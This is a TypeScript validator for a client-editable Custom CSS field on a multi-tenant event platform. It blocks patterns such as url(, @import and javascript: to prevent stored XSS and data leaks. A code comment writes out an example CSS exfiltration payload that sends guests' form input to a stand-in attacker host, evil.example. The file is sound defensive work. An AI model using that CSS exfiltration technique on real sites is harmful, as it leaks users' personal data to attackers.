/**
 * Validation for the client-safe "Custom CSS" field on Event Settings.
 *
 * This is deliberately CSS-only — clients never get raw JS/HTML, because
 * this platform is multi-tenant (many customers' events share one
 * Supabase project) and letting a client inject <script> would be a
 * stored-XSS vector hitting every guest who opens their event link.
 *
 * Even restricted to CSS, a few constructs are still dangerous enough to
 * block outright rather than trying to sanitize:
 * - Any "<" — the simplest way someone would try to smuggle a
 *   <script>/<style>-closing tag through a field that gets rendered
 *   inside a <style> element.
 * - `url(...)` — CSS can exfiltrate data with zero JavaScript: an
 *   attribute selector like `input[value^="a"] { background:
 *   url(https://evil.example/leak?a) }` fires a network request when a
 *   guest's form field starts with a given character, letting an
 *   attacker reconstruct RSVP/contact info one character at a time. It
 *   also covers the more mundane case of a remote tracking pixel. There's
 *   no way to tell a legitimate background-image url() from a malicious
 *   one from the text alone, so url() is blocked entirely — a custom
 *   background image should go through the existing Gallery/hero image
 *   upload flows instead.
 * - `@import` — pulls in an entire remote stylesheet outside our review.
 * - `expression(`, `-moz-binding`, `behavior:` — legacy IE/Firefox CSS
 *   constructs that historically executed script from a stylesheet.
 * - `javascript:` / `vbscript:` — script-executing pseudo-protocols.
 *
 * This is a pragmatic blocklist, not a full CSS-parser-based sanitizer
 * (e.g. via PostCSS validating an AST) — it covers the realistic attack
 * surface for a hand-typed customization field. Applied both when saving
 * (features/admin/event-settings/actions.ts) and again defensively at
 * render time (features/event-landing/custom-css-block.tsx), in case a
 * row is ever edited directly in the database outside the app.
 */

const MAX_LENGTH = 20_000;

const BLOCKED_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  { pattern: /</, reason: `contains "<" (not allowed — this field is CSS only)` },
  { pattern: /url\s*\(/i, reason: `contains url(...) (not allowed — use the Gallery/Link Preview Image uploads for images instead)` },
  { pattern: /@import/i, reason: `contains @import (not allowed)` },
  { pattern: /expression\s*\(/i, reason: `contains expression(...) (not allowed)` },
  { pattern: /-moz-binding/i, reason: `contains -moz-binding (not allowed)` },
  { pattern: /behavior\s*:/i, reason: `contains behavior: (not allowed)` },
  { pattern: /javascript\s*:/i, reason: `contains a javascript: reference (not allowed)` },
  { pattern: /vbscript\s*:/i, reason: `contains a vbscript: reference (not allowed)` },
];

/**
 * Returns null if `css` is safe to store/render, or a human-readable
 * reason string if it should be rejected.
 */
export function validateCustomCss(css: string): string | null {
  if (css.length > MAX_LENGTH) {
    return `Custom CSS is too long — limited to ${MAX_LENGTH.toLocaleString()} characters.`;
  }

  for (const { pattern, reason } of BLOCKED_PATTERNS) {
    if (pattern.test(css)) {
      return `Custom CSS ${reason}.`;
    }
  }

  return null;
}
